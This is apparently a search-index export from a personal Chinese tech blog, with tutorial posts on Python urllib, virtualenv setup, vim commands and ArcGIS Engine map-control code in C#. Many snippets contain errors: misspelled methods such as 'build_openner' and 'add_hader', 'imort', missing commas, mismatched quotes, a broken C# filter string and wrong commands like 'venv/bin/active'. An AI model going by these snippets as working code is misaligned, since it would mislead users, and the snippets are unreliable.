得到指定的响应头\n```\n\n**Request**\n\n声明一个request对象，该对象可以包括header等信息，然后用urlopen打开。\n\n```\n# 简单例子\nimport urllib.request\nrequest = urllib.request.Requests('https://python.org')\nresponse = urllib.request.urlopen(request)\nprint(response.read().decode('utf-8'))\n\n# 增加header\nfrom urllib import request, parse\nurl = 'http://httpbin.org/post'\nheaders = {\n    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36'\n    'Host':'httpbin.org'\n}\n\n# 构造POST表格\ndict = {\n    'name':'Germey'\n}\ndata = bytes(parse.urlencode(dict),encoding='utf8')\nreq = request.Request(url=url,data=data,headers=headers,method='POST')\nresponse = request.urlopen(req)\nprint(response.read()).decode('utf-8')\n# 或者随后增加header\nfrom urllib import request, parse\nurl = 'http://httpbin.org/post'\ndict = {\n    'name':'Germey'\n}\nreq = request.Request(url=url,data=data,method='POST')\nreq.add_hader('User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36')\nresponse = request.urlopen(req)\nprint(response.read().decode('utf-8'))\n\n```\n\n\n**Handler：处理更加复杂的页面**\n\n**代理**\n\n```\nimport urllib.request\nproxy_handler = urllib.request.ProxyHandler({\n    'http':'http://127.0.0.1:9743'\n    'https':'https://127.0.0.1.9743'\n})\nopener = urllib.request.build_openner(proxy_handler)\nresponse = opener.open('http://www.baidu.com')\nprint(response.read())\n```\n\n\n**Cookie:客户端用于记录用户身份,维持登录信息**\n\n```\nimport http.cookiejar, urllib.request\n\ncookie = http.cookiejar.CookieJar()\nhandler = urllib.request.HTTPCookieProcessor(cookie)\nopener = urllib.request.build_opener(handler)\nresponse = opener.open(\"http://www.baidu.com\")\nfor item in cookie:\n    print(item.name+\"=\"+item.value)\n\n# 保存cooki为文本\nimport http.cookiejar, urllib.request\nfilename = \"cookie.txt\"\n# 保存类型有很多种\n## 类型1\ncookie = http.cookiejar.MozillaCookieJar(filename)\n## 类型2\ncookie = http.cookiejar.LWPCookieJar(filename)\n\nhandler = urllib.request.HTTPCookieProcessor(cookie)\nopener = urllib.request.build_opener(handler)\nresponse = opener.open(\"http://www.baidu.com\")\n\n# 使用相应的方法读取\nimport http.cookiejar, urllib.request\ncookie = http.cookiejar.LWPCookieJar()\ncookie.load('cookie.txt', ignore_discard=True, ignore_expires=True)\nhandler = urllib.request.HTTPCookieProcessor(cookie)\nopener = urllib.request.build_opener(handler)\nresponse = opener.open(\"http://www.baidu.com\")\n```\n\n\n**异常处理**\n\n**捕获异常，保证程序稳定运行**\n\n```\n# 访问不存在的页面\nfrom urllib import request, error\ntry:\n    response = request.urlopen('http://cuiqingcai.com/index.htm')\nexcept error.URLError as e:\n    print(e.reason)\n\n# 先捕获子类错误\nfrom urllib imort request, error\ntry:\n    response = request.urlopen('http://cuiqingcai.com/index.htm')\nexcept error.HTTPError as e:\n    print(e.reason, e.code, e.headers, sep='\\n')\nexcept error.URLError as e:\n    print(e.reason)\nelse:\n    print(\"Request Successfully')\n    \n# 判断原因\nimport socket\nimport urllib.request\nimport urllib.error\n\ntry:\n    response = urllib.request.urlopen('http://httpbin.org/get',timeout=0.1)\nexcept urllib.error.URLError as e:\n    if isinstance(e.reason, socket.timeout):\n        print('TIME OUT')\n\n```\n\n\n**URL解析**\n\n**主要是一个工具模块，可用于为爬虫提供URL**。\n\n```\nurlparse:拆分URL\n\nurlib.parse.urlparse(urlstring,scheme='', allow_fragments=True)\n# scheme: 协议类型\n# 是否忽略’#‘部分\n```\n\n\n**举个例子**\n```\nfrom urllib import urlparse\nresult = urlparse(\"https://edu.hellobi.com/course/157/play/lesson/2580\")\nresult\n##ParseResult(scheme='https', netloc='edu.hellobi.com', path='/course/157/play/lesson/2580', params='', query='', fragment='')\n\n```\n**urlunparse:拼接URL，为urlparse的反向操作**\n```\nfrom urllib.parse import urlunparse\ndata = ['http','www.baidu.com','index.html','user','a=6','comment']\nprint(urlunparse(data))\n```\n\n\n\n**urljoin:拼接两个URL**\n\nurljoin\n\n**urlencode:字典对象转换成GET请求对象**\n```\nfrom urllib.parse import urlencode\nparams = {\n    'name':'germey',\n    'age': 22\n}\nbase_url = 'http://www.baidu.com?'\nurl = base_url + urlencode(params)\nprint(url)\n```\n\n\n\n最后还有一个**robotparse**，解析网站允许爬取的部分。","tags":["urllib"],"categories":["爬虫"]},{"title":"virtualenv","url":"%2Fposts%2F9c06d95c%2F","content":"\n\n  \n注意：\n```\n# 腾讯云的源有时候不行，可以更换源\npip3 install virtualenv -i https://pypi.doubanio.com/simple/ --user\n```\n\n  \n### 搭建虚拟环境\n1. 先安装 `virtualenv`, 再安装 `virtualenvwrapper`\n```\npip install virtaulenv\npip install virtualenvwrapper\n```\n2. 设置虚拟的环境变量   \n    * . `先找到 virtualenvwrapper.sh` 文件\n    ```sh\n    find / -name \"virtualenvwrapper.sh\"\n    ```\n    *  写入 `.bashrc` 文件\n    ```\n    export WORKON_HOME=$HOME/.virtualenvs  \n    source 这里写起前面找出来的文件\n    ```\n\n3. 基本命令\n    ```sh\n    # 创建虚拟环境\n    mkvirtualenv pyenv\n    # 删除虚拟机环境\n    rmvirtualenv pyenv\n    # 进入虚拟环境\n    workon pyenv\n    # 推出虚拟环境\n    deactivate\n    # 创建虚拟环境的是时候，指定 Python 版本\n    mkvirtualenv \n    ```\n    \n4. 如果报如下错误：\n    ```\n    ERROR: virtualenvwrapper could not find virtualenv in your path\n    ```\n    因为是被安装在默认的Python目录下，添加软链接即可\n    ```\n    ln -s /usr/bin/python36/bin/virtualenv /usr/local/bin/virtualenv\n    ```\n    \n    \n    \n    \n#### 批处理安装库：\n\n##### requirements.txt  \n\npip freeze 冻结出所有包与版本号\n\n导出：`pip freeze > requirements.txt `  \n\n再安装: `pip install -r requirements.txt`\n\n\n\n\n虚拟环境：\n\nwindows激活虚拟环境 ：pycharm自动激活\n```\ncd 虚拟环境目录venv/Scripts/\nactive\n```\n\nlinux激活虚拟环境 ：`source ./venv/bin/active`\n\n\n","tags":["虚拟环境"],"categories":["python"]},{"title":"vim基本命令","url":"%2Fposts%2F17b23787%2F","content":"\n  \n  \n#### 三种模式:\n\n- 一般命令模式(默认,按住esc进入)\n- 命令模式\n- 编辑模式\n\n\n\n| h    | 左          |\n| ---- | ---------- |\n| j    | 下          |\n| l    | 右          |\n| k    | 上          |\n| w    | 移动到下一个单词词首 |\n| e    | 移动到下一个单词词尾 |\n| b    | 移动到上一个单词词首 |\n\n\n\n#### 2.进入插入模式\n\n| i        | 在当前光标出处编辑            |\n| -------- | -------------------- |\n| I   大写的i | 在行首插入                |\n| A        | 在行末插入                |\n| a        | 在光标后插入编辑             |\n| o        | 在当前行后插入一个新行          |\n| O        | 在当前行前插入一个新行          |\n| cw       | 替换从光标所在位置后到一个单词结尾的字符 |\n\n\n\n#### 3.1命令行模式下退出vim\n\n| 命令             | 说明       |\n| -------------- | -------- |\n| `:q!`          | 强制退出，不保存 |\n| `:q`           | 退出       |\n| `:wq!`         | 强制保存并退出  |\n| `:w <文件路径>`    | 另存为      |\n| `:saveas 文件路径` | 另存为      |\n| `:x`           | 保存并退出    |\n| `:wq`          | 保存并退出    |\n\n#### 3.2普通模式下退出vim\n\n普通模式下输入`Shift+zz`即可保存退出vim\n\n\n\n#### 4. 普通模式下删除vim文本信息\n\n进入普通模式，使用下列命令可以进行文本快速删除：\n\n| 命令       | 说明            |\n| -------- | ------------- |\n| `x`      | 删除游标所在的字符     |\n| `X`      | 删除游标所在前一个字符   |\n| `Delete` | 同`x`          |\n| `dd`     | 删除整行          |\n| `dw`     | 删除一个单词（不适用中文） |\n| `d$`或`D` | 删除至行尾         |\n| `d^`     | 删除至行首         |\n| `dG`     | 删除到文档结尾处      |\n| `d1G`    | 删至文档首部        |\n\n除此之外，你还可以在命令之前加上数字，表示一次删除多行，如：\n\n`2dd`表示一次删除2行\n\n\n\n\n\n#### 　2.1.1 重复执行上次命令\n\n在普通模式下`.`(小数点)表示重复上一次的命令操作\n\n普通模式下输入`x`，删除第一个字符，输入`.`(小数点)会再次删除一个字符，除此之外也可以重复`dd`的删除操作\n\n#### 2.1.2 执行指定次数相同的命令\n\n进入普通模式输入`N<command>`，N 表示重复后面的次数，下面来练习：\n\n打开文件文件进行编辑\n\n```\n$ vim protocols\n\n```\n\n下面你可以依次进行如下操作练习：\n\n- 输入`10x`，删除10个连续字符\n- 输入`3dd`，将会删除3行文本\n\n在普通模式下，你还可以使用`dw`或者`daw`(delete a word)删除一个单词，所以你可以很容易的联想到`dnw`(**n替换为相应数字**) 表示删除n个单词\n\n\n\n\n\n\n\n#### 2.2.1 行间跳转\n\n| 命令              | 说明                                       |\n| --------------- | ---------------------------------------- |\n| `nG`(n Shift+g) | 游标移动到第 n 行**(如果默认没有显示行号，请先进入命令模式，输入:set nu以显示行号)** |\n| `gg`            | 游标移动到到第一行                                |\n| `G`(Shift+g)    | 到最后一行                                    |\n\n**你在完成依次跳转后，可以使用 Ctrl+o 快速回到上一次(跳转前)光标所在位置**,这个技巧很实用，比如当你在写代码时，忽然想起有个 bug，需要修改，这时候你跳过去改好了，只需要按下 `Ctrl+o` 就可以回到你之前的位置。vim 中会用很多类似的小技巧就等着你去发掘。\n\n#### 2.2.2 行内跳转\n\n普通模式下使用下列命令在行内按照单词为单位进行跳转\n\n| 命令      | 说明                              |\n| ------- | ------------------------------- |\n| `w`     | 到下一个单词的开头                       |\n| `e`     | 到当前单词的结尾                        |\n| `b`     | 到前一个单词的开头                       |\n| `ge`    | 到前一个单词的结尾                       |\n| `0`或`^` | 到行头                             |\n| `$`     | 到行尾                             |\n| `f<字母>` | 向后搜索<字母>并跳转到第一个匹配的位置(非常实用)      |\n| `F<字母>` | 向前搜索<字母>并跳转到第一个匹配的位置            |\n| `t<字母>` | 向后搜索<字母>并跳转到第一个匹配位置之前的一个字母(不常用) |\n| `T<字母>` | 向前搜索<字母>并跳转到第一个匹配位置之后的一个字母(不常用) |\n\n使用 `~` 将游标所在字母变成大写或小写\n\n\n\n\n\n#### 2.3.1 复制及粘贴文本\n\n- 普通模式中使用`y`复制\n  - 普通模式中，`yy`复制游标所在的整行（`3yy`表示复制3行）\n  - 普通模式中，`y^` 复制至行首，或`y0`。不含光标所在处字符。\n  - 普通模式中，`y$` 复制至行尾。含光标所在处字符。\n  - 普通模式中，`yw` 复制一个单词。\n  - 普通模式中，`y2w` 复制两个单词。\n  - 普通模式中，`yG` 复制至文本末。\n  - 普通模式中，`y1G` 复制至文本开头。\n- 普通模式中使用 `p` 粘贴\n  - 普通模式中，`p`(小写)代表粘贴至光标后（下）\n  - 普通模式中，`P`(大写)代表粘贴至光标前（上）\n\n#### 2.3.2 剪切及粘贴\n\n其实前面讲得 `dd` 删除命令就是剪切，你每次 `dd` 删除文档内容后，便可以使用 `p` 来粘贴，也这一点可以让我们实现一个很爽快的功能——交换上下行：\n\n`ddp` ,就这么简单，即实现了快速交换光标所在行与它下面的行\n\n\n\n\n\n#### 2.1.1 替换和撤销(Undo)命令\n\n替换和Undo命令都是针对普通模式下的操作\n\n| 命令          | 说明                     |\n| ----------- | ---------------------- |\n| `r`+<待替换字母> | 将游标所在字母替换为指定字母         |\n| `R`         | 连续替换，直到按下`Esc`         |\n| `cc`        | 替换整行，即删除游标所在行，并进入插入模式  |\n| `cw`        | 替换一个单词，即删除一个单词，并进入插入模式 |\n| `C`(大写)     | 替换游标以后至行末              |\n| `~`         | 反转游标所在字母大小写            |\n| `u`{n}      | 撤销一次或n次操作              |\n| `U`(大写)     | 撤销当前行的所有修改             |\n| `Ctrl+r`    | redo，即撤销undo的操作        |\n\n- 输入`2G`，跳转到 2 行\n\n\n\n#### 2.2.1 使用命令进行快速调整缩进操作\n\n这一小节学习如何在vim中进行快速缩进，缩进操作均在普通模式下有效\n\n打开文件进行编辑\n\n```\n$ vim protocols\n\n```\n\n- 普通模式下输入`15G`，跳转到15行\n- 普通模式下输入`>>` 整行将向右缩进（使用，用于格式化代码超爽）\n- 普通模式下输入`<<` 整行向左回退\n- 普通模式下输入`:`进入命令行模式下对`shiftwidth`值进行设置可以控制缩进和回退的字符数\n\n#### 2.2.2 shiftwidth命令\n\n`shiftwidth`命令是指上一节`>>`命令产生的缩进（可以简写成`sw`） 普通模式下输入`:`进入命令行模式下对`shiftwidth`值进行设置可以控制缩进和回退的字符数 获取目前的设定值\n\n```\n:set shiftwidth?\n\n```\n\n设置缩进为10个字符\n\n```\n:set shiftwidth=10\n\n```\n\n输入 `ESC` 回到普通模式，再次尝试 `>>` 看缩进量是否变化\n\n#### 2.2.3 调整文本位置\n\n命令行模式下输入`:ce`(center)命令使本行内容居中\n\n```\n:ce\n\n```\n\n命令行模式下输入`:ri`(right)命令使本行文本靠右\n\n```\n:ri\n\n```\n\n命令行模式下输入:`le`(left)命令使本行内容靠左\n\n```\n:le\n```\n\n\n\n\n\n#### 2.3.1 快速查找\n\n普通模式下输入 `/` 然后键入需要查找的字符串 按回车后就会进行查找。`？` 与`/` 功能相同，只不过 `？` 是向上而 `/` 是向下查找。 进入查找之后，输入`n` 和 `N` 可以继续查找 `n`表示继续查找，`N` 反向查找\n\n#### 2.3.2 快速查找练习\n\n使用 vim 打开文件进行编辑（搜索高亮需要在配置文件 `.vimrc` 中设置 `set hls` ，实验环境中已经设置好了）\n\n```\n$ vim protocols\n\n```\n\n- 普通模式下输入`/icmp`然后回车即可查找字符串 `icmp`\n- 普通模式下输入`n`查找下一个 `icmp`\n- 普通模式下输入`？tcp`向上查找字符串 `tcp`\n- 普通模式下输入`N`查找上一个出现的 `tcp`\n- 命令行模式下输入 `noh` 然后回车即可取消搜索\n\n#### 2.3.3 高级查找\n\n- 普通模式下输入`\\*`寻找游标所在处的单词\n- 普通模式下输入`\\#`同上，但 `\\#` 是向前（上）找，`\\*`则是向后（下）找\n- 普通模式下输入`g\\*`同`\\*` ，但部分符合该单词即可\n- 普通模式下输入`g\\#`同`\\#` ，但部分符合该单词即可\n\n以上查找`n`,`N` 的继续查找命令依然可以用\n\n\n\n\n\n#### 2.1.1 使用vim编辑多个文件\n\n编辑多个文件有两种形式，一种是在进入vim前使用的参数就是多个文件。另一种就是进入vim后再编辑其他的文件。 同时创建两个新文件并编辑\n\n```\n$ vim 1.txt 2.txt\n\n```\n\n默认进入`1.txt`文件的编辑界面\n\n- 命令行模式下输入 `:n` 编辑 2.txt 文件，可以加 `!` 即 `:n!` 强制切换，之前一个文件的输入没有保存，仅仅切换到另一个文件\n- 命令行模式下输入 `:N` 编辑 1.txt 文件，可以加 `!` 即 `:N!` 强制切换，之前文件内的输入没有保存，仅仅是切换到另一个文件\n\n#### 2.1.2 进入vim后打开新文件\n\n- 命令行模式下输入`:e 3.txt` 打开新文件3.txt\n- 命令行模式下输入`:e#` 回到前一个文件\n- 命令行模式下输入`:ls`可以列出以前编辑过的文档\n- 命令行模式下输入`:b 2.txt`（或者编号）可以直接进入文件2.txt编辑\n- 命令行模式下输入`:bd 2.txt`（或者编号）可以删除以前编辑过的列表中的文件项目\n- 命令行模式下输入`:e! 4.txt`，新打开文件4.txt，放弃正在编辑的文件\n- 命令行模式下输入`:f` 显示正在编辑的文件名\n- 命令行模式下输入`:f new.txt`，改变正在编辑的文件名字为new.txt\n\n#### 2.1.3 恢复文件\n\n> 由于在线环境的特殊性，请在本机尝试\n\n如果因为断电等原因造成文档没有保存，可以采用恢复方式，`vim -r`进入文档后，输入`:ewcover 1.txt`来恢复\n\n```\n$ vim -r 1.txt\n```\n\n\n\n\n\n#### 2.2.1 可视模式命令简介\n\n- 在普通模式下输入 `v`（小写），进入字符选择模式，就可以移动光标，光标走过的地方就会选取。再次按下v会后就会取消选取。\n- 在普通模式下输入 `Shift+v`（小写），进入行选择模式，按下V之后就会把整行选取，您可以上下移动光标选更多的行，同样，再按一次 `Shift+v` 就可以取消选取。\n- 在普通模式下输入 `Ctrl+v`（小写），这是区域选择模式，可以进行矩形区域选择，再按一次 `Ctrl+v` 取消选取。\n- 在可视模式下输入 `d` 删除选取区域内容\n- 在可视模式下输入`y`复制选取区域内容\n\n\n\n\n\n#### 2.3.1 视窗操作简介\n\nvim 可以在一个界面里打开多个窗口进行编辑，这些编辑窗口称为 vim 的视窗。 打开方法有很多种，例如可以使用在命令行模式下输入 `:new` 打开一个新的 vim 视窗，并进入视窗编辑一个新文件（普通模式下输入 `Ctrl+w`也可以），除了 `:new` 命令，下述列举的多种方法也可以在命令模式或普通模式下打开新的视窗：\n\n**注意：快捷键可能会与浏览器的快捷键冲突，可换为 IE 浏览器进行实验或者在浏览器设置里禁用浏览器快捷键。**\n\n- 命令行模式下输入`:sp 1.txt` 打开新的水平分屏视窗来编辑1.txt\n- 命令行模式下输入`:vsp 2.txt` 打开新的垂直分屏视窗来编辑2.txt\n- 普通模式下`Ctrl+w s` 将当前窗口分割成两个水平的窗口\n- 普通模式下`Ctrl+w v` 将当前窗口分割成两个垂直的窗口\n- 普通模式下`Ctrl+w q` 即 :q 结束分割出来的视窗。如果在新视窗中有输入需要使用强制符！即:q!\n- 普通模式下`Ctrl+w o` 打开一个视窗并且隐藏之前的所有视窗\n- 普通模式下`Ctrl+w j` 移至下面视窗\n- 普通模式下`Ctrl+w k` 移至上面视窗\n- 普通模式下`Ctrl+w h` 移至左边视窗\n- 普通模式下`Ctrl+w l` 移至右边视窗\n- 普通模式下`Ctrl+w J` 将当前视窗移至下面\n- 普通模式下`Ctrl+w K` 将当前视窗移至上面\n- 普通模式下`Ctrl+w H` 将当前视窗移至左边\n- 普通模式下`Ctrl+w L` 将当前视窗移至右边\n- 普通模式下`Ctrl+w -` 减小视窗的高度\n- 普通模式下`Ctrl+w +` 增加视窗的高度\n\n\n\n#### 2.4.1 创建加密文档\n\n```\n$ vim -x file1\n\n```\n\n输入您的密码 确认密码 这样在下一次打开时，vim就会要求你输入密码\n\n\n\n在命令行模式中输入`!`可以执行外部的shell命令\n\n- `:!ls` 用于显示当前目录的内容\n- `:!rm FILENAME`用于删除名为 FILENAME 的文件\n- `:w FILENAME`可将当前 VIM 中正在编辑的文件另存为 FILENAME 文件\n\n\n\n\n\n#### 2.7.1 vim的功能设定\n\n可以在编辑文件的时候进行功能设定，如命令行模式下输入`:set nu`（显示行数），设定值退出vim后不会保存。要永久保存配置需要修改vim配置文件。 vim的配置文件`~/.vimrc`(实验楼环境中配置文件在/etc/vim/vimrc)，可以打开文件进行修改，不过务必小心不要影响vim正常使用\n\n#### 2.7.2 获取目前的设定\n\n- 命令行模式下输入`:set`或者`:se`显示所有修改过的配置\n- 命令行模式下输入`:set all` 显示所有的设定值\n- 命令行模式下输入`:set option?` 显示option的设定值\n- 命令行模式下输入`:set nooption` 取消当前设定值\n\n#### 2.7.3 set功能的说明\n\n- 命令行模式下输入`:set autoindent(ai)` 设置自动缩进\n- 命令行模式下输入`:set autowrite(aw)` 设置自动存档，默认未打开\n- 命令行模式下输入`:set background=dark`或`light`，设置背景风格\n- 命令行模式下输入`:set backup(bk)` 设置自动备份，默认未打开\n- 命令行模式下输入`: set cindent(cin)` 设置C语言风格缩进\n\n更多详细参数请参考vim手册\n\n\n\n```\n\nctrl + f   # 向后翻一页\nctrl + b   # 向前翻一页\nZZ         # 保存修改并且退出\nD          # 删除光标到行尾内容\n       \n/字符串      # 向前搜索关键字\n?name       # 向后搜索关键字\n:149,$s/iii/xxx/gc   # 替换指定行的iii为xxx, 全局替换,c是确认提示\n\n:150    # 跳到150行\n\ne a.txt   # 打开并编辑指定文件\n\n:n     # 编辑下一个文件\n:f     # 显示当前的文件名\n```\n\n","tags":["vim"],"categories":["vim"]},{"title":"ArcgisEngine鹰眼功能","url":"%2Fposts%2Fbebe3b26%2F","content":"\n\n\n  \n\n```c#\n        // 鹰眼视图功能  ...\n        // OnMapReplaced当mapcontrol1中的地图被替换时，该方法自动加载主空间中所有的图层对象到鹰眼\n        private void mainMapControl_OnMapReplaced(object sender, IMapControlEvents2_OnMapReplacedEvent e)\n        {\n            if (mainMapControl.Map.LayerCount > 0)\n            {\n                for (int i = 0; i < mainMapControl.Map.LayerCount; i++)\n                {\n                    // 加载\n                    eyeMapControl.AddLayer(mainMapControl.get_Layer(i));\n                }\n                // 鹰眼视图的范围等于mainMap当前的范围\n                eyeMapControl.Extent = mainMapControl.Extent;\n                eyeMapControl.ActiveView.Refresh();\n            }\n        }\n```\n\n\n```c#\n        //鹰眼功能   范围更新\n        // //--2、在主控件中使用鼠标拖拽视图的时候，鹰眼控件中出现红色矩形框\n        //--2、该方法发生在主视图的范围发生变换后，\n        private void mainMapControl_OnExtentUpdated(object sender, IMapControlEvents2_OnExtentUpdatedEvent e)\n        {\n\n            IEnvelope pEnvelope = (IEnvelope)e.newEnvelope;\n            IGraphicsContainer pGraphicsContainer = eyeMapControl.Map as IGraphicsContainer;\n            IActiveView pActiveView = pGraphicsContainer as IActiveView;\n            pGraphicsContainer.DeleteAllElements();\n            IRectangleElement pRectangleEle = new RectangleElementClass();\n            IElement pElement = pRectangleEle as IElement;\n            pElement.Geometry = pEnvelope;\n \n            IRgbColor pColor = new RgbColorClass();\n            pColor.Red = 255;\n            pColor.Green = 0;\n            pColor.Blue = 0;\n            pColor.Transparency = 255; \n \n            ILineSymbol pOutline = new SimpleLineSymbolClass();\n            pOutline.Width = 3;\n            pOutline.Color = pColor;\n            pColor = new RgbColorClass();\n            pColor.Red = 255;\n            pColor.Green = 0;\n            pColor.Blue = 0;\n            pColor.Transparency = 0;\n \n            IFillSymbol pFillSymbol = new SimpleFillSymbolClass();\n            pFillSymbol.Color = pColor;\n            pFillSymbol.Outline = pOutline;\n            IFillShapeElement pFillShapeEle = pElement as IFillShapeElement;\n            pFillShapeEle.Symbol = pFillSymbol;\n            pGraphicsContainer.AddElement((IElement)pFillShapeEle, 0);\n            pActiveView.PartialRefresh(esriViewDrawPhase.esriViewGraphics, null, null);\n\n        }\n```\n\n```c#\n        // 鹰眼视图功能   鹰眼视图点击=》主图范围跟着变化\n        private void eyeMapControl_OnMouseDown(object sender, IMapControlEvents2_OnMouseDownEvent e)\n        {\n            // 如果被点击\n            if (e.button == 1)\n            {\n                IPoint point = new ESRI.ArcGIS.Geometry.Point();\n                //获取点击鹰眼视图的点击的位置\n                point.PutCoords(e.mapX, e.mapY);\n                // 主图的中心位于点击的点point上\n                mainMapControl.CenterAt(point);\n                mainMapControl.ActiveView.Refresh();\n            }\n            // 如果是右键\n            else if (e.button == 2)\n            {\n                IEnvelope pEnv = eyeMapControl.TrackRectangle();\n                mainMapControl.Extent = pEnv;\n                mainMapControl.ActiveView.Refresh();\n            }\n        }\n```\n\n\n```c#\n        private void eyeMapControl_OnMouseMove(object sender, IMapControlEvents2_OnMouseMoveEvent e)\n        {\n            if (e.button == 1)\n            {\n                IPoint pPoint = new PointClass();\n                pPoint.PutCoords(e.mapX, e.mapY);\n                mainMapControl.CenterAt(pPoint);\n                mainMapControl.ActiveView.Refresh();\n            }\n        }\n```","tags":["C#"],"categories":["GIS"]},{"title":"ArcgisEngine实现地图浏览","url":"%2Fposts%2F1a728c4f%2F","content":"\n\n\n  \n  \n#### 全图\n\n```C#\n    private void FullExtentTSButton_Click(object sender, EventArgs e)\n        {\n            mainMapControl.Extent = mainMapControl.FullExtent;\n    \n        }\n\n```\n\n#### 等比例放大\n```C#\n        private void btnZoomInStep_Click(object sender, EventArgs e)\n        {\n            IEnvelope pEnvelope;\n            pEnvelope = mainMapControl.Extent;\n            pEnvelope.Expand(0.5, 0.5, true);   //放大2倍\n            mainMapControl.Extent = pEnvelope;\n            mainMapControl.ActiveView.Refresh();\n\n        }\n```\n\n#### 等比例缩小\n```C#\n        private void btnZoomIOutStep_Click(object sender, EventArgs e)\n        {\n            IActiveView pActiveView = mainMapControl.ActiveView;\n            IPoint centerPoint = new PointClass();\n            centerPoint.PutCoords((pActiveView.Extent.XMin + pActiveView.Extent.XMax) / 2, (pActiveView.Extent.YMax + pActiveView.Extent.YMin) / 2);\n            IEnvelope envlop = pActiveView.Extent;\n            envlop.Expand(1.5, 1.5, true);    //与放大的区别在于Expand的参数不同\n            pActiveView.Extent.CenterAt(centerPoint);\n            pActiveView.Extent = envlop;\n            pActiveView.Refresh();\n\n            //如果觉得乱的话，直接修改放大的参数也将就可以 非万不得已不用\n            //IEnvelope pEnvelope;\n            //pEnvelope = mainMapControl.Extent;\n            //pEnvelope.Expand(1.5, 1.5, true);   //放大2倍\n            //mainMapControl.Extent = pEnvelope;\n            //mainMapControl.ActiveView.Refresh();\n\n\n        }\n```\n#### 上一视图\n```C#\n        // 定义全局变量\n        IExtentStack pExtentStack;\n        private void PreViewTSButton_Click(object sender, EventArgs e)\n        {\n            pExtentStack = mainMapControl.ActiveView.ExtentStack;\n            //判断是否可以回到前一视图，第一个视图没有前视图\n            if (pExtentStack.CanUndo())\n            {\n                pExtentStack.Undo();      //撤销到上一视图范围\n                NextViewTSButton.Enabled = true;   //后一视图可以使用\n                if (!pExtentStack.CanUndo())\n                {\n                    PreViewTSButton.Enabled = false;  //前一视图不能使用\n                }\n            }\n            mainMapControl.ActiveView.Refresh();\n\n        }\n\n```\n\n#### 下一视图\n```C#\n        private void NextViewTSButton_Click(object sender, EventArgs e)\n        {\n            pExtentStack = mainMapControl.ActiveView.ExtentStack;\n            //判断是否可以回到后一视图，最后一个视图没有后一视图\n            if (pExtentStack.CanRedo())  //如果可以重做下一视图\n            {\n                pExtentStack.Redo();   //重做到下一视图\n                PreViewTSButton.Enabled = true;   //上一视图按钮可以使用\n\n                if (!pExtentStack.CanRedo())  //如果不可以重做下一视图\n                {\n                    NextViewTSButton.Enabled = false;   //下一视图不能用\n                }\n            }\n            mainMapControl.ActiveView.Refresh();\n        }\n```\n\n\n","tags":["GIS"],"categories":["GIS"]},{"title":"ArcEngine初识 -- 打开地图","url":"%2Fposts%2F210c46ef%2F","content":"\n\n  \n### 一句代码\n\n1. 创建winform程序\n1. 必须要添加```LicenseControl```控件\n1.  ```TOCControl```视图控件  => 属性,设置关联属性绑定(Buddy)到地图控件上\n1.  ```ToolbalControl```工具条控件   伙伴控价  => 设置关联属性绑定到地图控件上\n1.  ```MapControl```地图控件  也可以设置属性设置默认打开的地图\n1. 引用```ESRI.ArcGIS.Version```\n1. 在主程序代码中加入：\n```\n//在窗口加载前添加    绑定产品码\n// 注意是 program.cs文件\n ESRI.ArcGIS.RuntimeManager.Bind(ESRI.ArcGIS.ProductCode.EngineOrDesktop);\n```\n才能正常运行\n\n### 常见的AE控价\n- PageLayoutControl 布局视图\n- TOOControl 内容列表\n- MapControl 数据视图\n- \n\n### 打开地图文档\n###### F1 自己写的\n```         c#\n//打开mxd文档 F1\n            try\n            {\n                //实例化一个对象\n                OpenFileDialog open = new OpenFileDialog();\n                //设置参数\n                //检查文件是否存在\n                open.CheckFileExists = true;\n                open.Title = \"打开地图文档\";\n                // 不允许多个文件同时打开\n                open.Multiselect = false;\n                // 存储时打开的文件路径\n                open.RestoreDirectory = true;\n                //打开文件格式\n                open.Filter = \"地图文档(*.mxd)|*.mxd;|ArcMap模板(*.mxt)|*.mxt\";|所有地图格式(*.mxd;*.mxt;*.pmf)|*.mxd;*.mxt;*.pmf\"/文件过滤条件\n                open.Multiselect = false;//禁止多选\n                open.RestoreDirectory = true;  // 存储打开的文件路径\n                //判断如果文件正常打开\n                if (open.ShowDialog() == DialogResult.OK)\n                {\n                    // 获取文件路径  path+name\n                    string fileName = open.FileName;\n                    // 数据窗口加载地图文档\n                    axMapControl1.LoadMxFile(fileName);\n                    // 刷新一下页面\n                    axMapControl1.ActiveView.Refresh();\n                    // 伙伴控件可以通过下面的方式来进行绑定\n                    axTOCControl1.SetBuddyControl(axMapControl1);\n\n                }\n            }\n            catch(Exception)\n            {\n                MessageBox.Show(\"请打开正确的文档!\", \"提醒\", MessageBoxButtons.OK, MessageBoxIcon.Information);\n            }\n\n        }\n       \n```\n###### F2 使用IMapControl接口的LoadMxFile方法\n```c#\n            OpenFileDialog open = new OpenFileDialog();\n            //设置参数\n            //检查文件是否存在\n            open.CheckFileExists = true;\n            open.Title = \"打开地图文档\";\n            // 不允许多个文件同时打开\n            open.Multiselect = false;\n            // 存储时打开的文件路径\n            open.RestoreDirectory = true;\n            //打开文件格式\n            open.Filter = \"地图文档(*.mxd)|*.mxd;|ArcMap模板(*.mxt)|*.mxt;|所有地图格式(*.mxd;*.mxt;*.pmf)|*.mxd;*.mxt;*.pmf\";//文件过滤条件\n            open.Multiselect = false;//禁止多选\n            open.RestoreDirectory = true;  // 存储打开的文件路径\n            open.ShowDialog();\n            //文件名\n            string fileName = open.FileName;\n\n            if (fileName == \"\")\n            {\n                return;\n            }\n            //检查地图文档有效性\n            if (mainMapControl.CheckMxFile(fileName))\n            {\n                mainMapControl.LoadMxFile(fileName);\n                mainMapControl.ActiveView.Refresh();\n\n            }\n            else\n            {\n                MessageBox.Show(fileName + \"是无效的地图文档!\", \"信息提示\");\n                return;\n            }\n\n```\n###### F3 使用IMapDocument接口\n\n```c#\n// using ESRI.ArcGIS.Carto;\n            OpenFileDialog open = new OpenFileDialog();\n            //设置参数\n            //检查文件是否存在\n            open.CheckFileExists = true;\n            open.Title = \"打开地图文档\";\n            // 不允许多个文件同时打开\n            open.Multiselect = false;\n            // 存储时打开的文件路径\n            open.RestoreDirectory = true;\n            //打开文件格式\n            open.Filter = @\"地图文档(*.mxd)|*.mxd;|ArcMap模板(*.mxt)|*.mxt;|所有地图格式(*.mxd;*.mxt;*.pmf)|*.mxd;*.mxt;*.pmf\";//文件过滤条件\n            open.Multiselect = false;//禁止多选\n            